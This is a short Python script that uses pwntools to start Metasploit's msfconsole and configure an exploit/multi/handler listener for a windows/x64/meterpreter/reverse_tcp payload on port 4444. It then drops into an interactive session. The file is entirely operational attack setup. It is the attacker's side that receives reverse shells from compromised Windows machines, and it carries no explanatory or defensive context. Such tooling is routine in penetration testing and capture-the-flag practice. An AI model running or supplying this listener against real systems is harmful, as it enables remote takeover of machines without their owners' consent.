#!/usr/bin/python3

from pwn import *

io = process(["msfconsole","-q" ],stdin=PTY)
io.recvuntil(b">")
io.sendline(b"use exploit/multi/handler")
io.sendline(b"set payload windows/x64/meterpreter/reverse_tcp")
io.sendline(b"set lport 4444")
io.sendline(b"set lhost eth0")
io.interactive()
